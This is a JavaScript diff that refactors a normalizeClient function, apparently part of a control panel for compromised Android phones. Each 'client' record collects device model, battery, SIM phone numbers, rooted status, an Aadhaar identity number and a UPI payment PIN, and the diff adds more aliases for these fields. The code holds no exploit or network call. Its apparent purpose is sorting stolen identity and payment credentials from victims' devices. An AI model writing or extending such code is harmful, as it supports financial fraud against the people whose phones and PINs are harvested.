@@ -28,6 +28,7 @@ import {
   hasClientRecords,
   mergeClientProfile,
   normalizeClientSims,
+  parseDeviceInfoString,
   phoneNumbersForClient,
   providerForClient,
   simCountForClient,
@@ -676,32 +677,18 @@ function toBoolStatus(v) {
     s === "yes"
   );
 }
-function parseDeviceInfoString(s) {
-  const out = {};
-  if (!s || typeof s != "string") return out;
-  s.split(/\r?\n/).forEach((line) => {
-    const m = line.match(/^\s*([A-Za-z][A-Za-z _]*?)\s*:\s*(.+?)\s*$/);
-    if (!m) return;
-    const k = m[1].toLowerCase().replace(/\s+/g, ""),
-      v = m[2].trim();
-    k === "model" && (out.model = v);
-    k === "osversion" && (out.os = v);
-    k === "devicename" && (out.deviceName = v);
-    k === "deviceid" && (out.deviceId = v);
-  });
-  return out;
-}
 function normalizeClient(raw, sim) {
   if (!raw || typeof raw != "object") return null;
   raw = mergeClientProfile(raw);
-  const c = { ...raw };
   const rawDeviceInfo = firstOf(raw, ["Device_info", "device_info", "DeviceInfo", "deviceInfo"]),
     dinfo =
       typeof rawDeviceInfo === "string"
         ? parseDeviceInfoString(rawDeviceInfo)
         : rawDeviceInfo && typeof rawDeviceInfo === "object"
           ? rawDeviceInfo
-          : {},
+          : {};
+  raw = mergeClientProfile({ ...dinfo, ...raw });
+  const c = { ...raw },
     osVersion = firstOf(dinfo, ["os", "osVersion", "androidVersion"]);
   if (
     (c.modelName ||
@@ -710,7 +697,6 @@ function normalizeClient(raw, sim) {
           "Name",
           "name",
           "device_name",
-          "deviceName",
           "device_name_model",
           "model",
           "Model",
@@ -719,11 +705,12 @@ function normalizeClient(raw, sim) {
           "device_model",
           "deviceModel",
           "phoneModel",
+          "d_name",
+          "deviceName",
           "brand",
           "manufacturer",
           "product",
           "label",
-          "d_name",
         ]) ||
         firstOf(dinfo, ["model", "Model", "modelName", "deviceName", "name"]) ||
         "Unknown Device"),
@@ -734,7 +721,10 @@ function normalizeClient(raw, sim) {
       "battery",
       "charge",
       "batteryLevel",
+      "BatteryLevel",
       "battery_level",
+      "battery_percentage",
+      "batteryPercent",
       "bat",
     ]);
     b !== void 0 && (c.battery = b);
@@ -760,7 +750,8 @@ function normalizeClient(raw, sim) {
     s !== void 0 && (c.status = toBoolStatus(s));
   }
   const normalizedSims = normalizeClientSims(raw, sim);
-  c.sims = normalizedSims;
+  if (normalizedSims.length) c.sims = normalizedSims;
+  else delete c.sims;
   if (!c.mobNo) {
     const m = firstOf(raw, [
       "phoneNumber",
@@ -768,11 +759,18 @@ function normalizeClient(raw, sim) {
       "number",
       "msisdn",
       "mobile",
+      "mobileNumber",
+      "mobile_number",
+      "mobileNo",
+      "mobile_no",
       "mob_no",
       "phone_number",
+      "phoneNo",
+      "phone_no",
       "contactNumber",
       "Number",
       "Mobile",
+      "MobileNo",
     ]);
     (typeof m === "string" || typeof m === "number") &&
       String(m).trim() &&
@@ -782,10 +780,9 @@ function normalizeClient(raw, sim) {
     typeof c.mobNo === "string" || typeof c.mobNo === "number"
       ? String(c.mobNo).trim()
       : "";
-  if (primaryMobile.replace(/\D/g, "").length >= 10) {
+  if (primaryMobile.replace(/\D/g, "").length >= 10 && Array.isArray(c.sims)) {
     const primarySim = c.sims.find((entry) => !entry.phoneNumber);
     if (primarySim) primarySim.phoneNumber = primaryMobile;
-    else if (!c.sims.length) c.sims = [{ phoneNumber: primaryMobile, slot: 1 }];
   }
   const explicitDualSim =
     firstOf(raw, ["dualSim", "dualsim", "isDualSim", "is_dual_sim", "DualSim", "DualSIM"]) ??
@@ -795,7 +792,7 @@ function normalizeClient(raw, sim) {
   if (c.dualSim === void 0 && explicitDualSim !== void 0) {
     c.dualSim = toBoolStatus(explicitDualSim);
   }
-  if (c.dualSim === void 0 && c.sims.length > 1) c.dualSim = !0;
+  if (c.dualSim === void 0 && Array.isArray(c.sims) && c.sims.length > 1) c.dualSim = !0;
   if (
     (c.person || (c.person = firstOf(raw, ["Name", "name"])),
     c.aadhaar || (c.aadhaar = firstOf(raw, ["Aadhaar", "aadhaar", "aadhar"])),
@@ -806,6 +803,8 @@ function normalizeClient(raw, sim) {
   ) {
     const p = firstOf(raw, [
       "carrier",
+      "carrierName",
+      "carrier_name",
       "operator",
       "network",
       "provider",
@@ -850,6 +849,8 @@ function normalizeClient(raw, sim) {
     const r = firstOf(raw, ["rooted", "isRooted", "root"]);
     r !== void 0 && (c.isRoot = r === !0 || r === "true" || r === 1);
   }
+  c.androidV != null &&
+    (c.androidV = String(c.androidV).replace(/^Android\s*/i, ""));
   return (
     c.upipin || (c.upipin = firstOf(raw, ["upiPin", "upi_pin", "pin"])),
     c
